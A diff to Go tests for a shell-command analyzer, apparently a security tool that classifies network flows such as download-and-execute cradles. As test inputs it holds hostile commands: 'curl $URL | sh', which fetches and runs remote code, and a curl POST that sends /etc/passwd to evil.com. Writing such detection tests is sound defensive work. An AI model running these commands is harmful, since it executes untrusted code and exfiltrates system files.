@@ -39,6 +39,20 @@ func TestNetworkDecision_FromDigest(t *testing.T) {
 			want: &NetworkDecision{Flow: NetworkFlowCradle, Canonical: true, Hosts: []string{"evil.sh"}},
 		},
 		{
+			// The real analyzer emits a ⊤ egress as Targets=[] with
+			// Arbitrary=true (verified against flowsh): the summary must still
+			// be produced, keyed on the egress EFFECT, not on the target list.
+			name: "unresolved (⊤) egress effect still yields a summary",
+			in: sdktools.ShellAnalysisDigest{
+				Effects: []sdktools.ShellEffectDigest{
+					{Kind: "CodeExec", Targets: []string{}},
+					{Kind: shellEffectKindNetEgress, Targets: []string{}, Arbitrary: true},
+				},
+				CradleFlows: []sdktools.ShellFlowPairDigest{{Source: "NetEgress|Direct|*", Sink: "CodeExec|Direct|*"}},
+			},
+			want: &NetworkDecision{Flow: NetworkFlowCradle, Canonical: true},
+		},
+		{
 			name: "ingest flow is non-canonical with the host and the written operand",
 			in: sdktools.ShellAnalysisDigest{
 				Effects: []sdktools.ShellEffectDigest{
@@ -102,6 +116,9 @@ func TestHostOfTarget(t *testing.T) {
 		"https://user:pass@host.example:8443/p": "host.example",
 		"api.example.com:443":                   "api.example.com",
 		"[2001:db8::1]:443":                     "[2001:db8::1]",
+		"POST":                                  "",
+		"GET":                                   "",
+		"PUT":                                   "",
 		"*":                                     "",
 		"":                                      "",
 	}
@@ -144,6 +161,25 @@ func TestNetworkDecision_FromRealAnalysis(t *testing.T) {
 			command:   "curl -fsSL https://example.com/x | head",
 			wantFlow:  NetworkFlowFetch,
 			wantHosts: []string{"example.com"},
+		},
+		{
+			// A ⊤ egress: the analyzer establishes the cradle (C5) but cannot
+			// resolve the host (Targets=[] + Arbitrary). The summary must still
+			// appear — this is the canonical download-and-execute cradle the
+			// feature exists to surface.
+			name:      "unresolved-host cradle still yields a summary",
+			command:   "curl -fsSL $URL | sh",
+			wantFlow:  NetworkFlowCradle,
+			wantCanon: true,
+			wantHosts: nil,
+		},
+		{
+			// flowsh models curl's -X value as an egress target; the METHOD must
+			// not be published as a host.
+			name:      "a non-GET method is not published as an egress host",
+			command:   "curl -X POST https://evil.com -d @/etc/passwd",
+			wantFlow:  NetworkFlowFetch,
+			wantHosts: []string{"evil.com"},
 		},
 	}
 
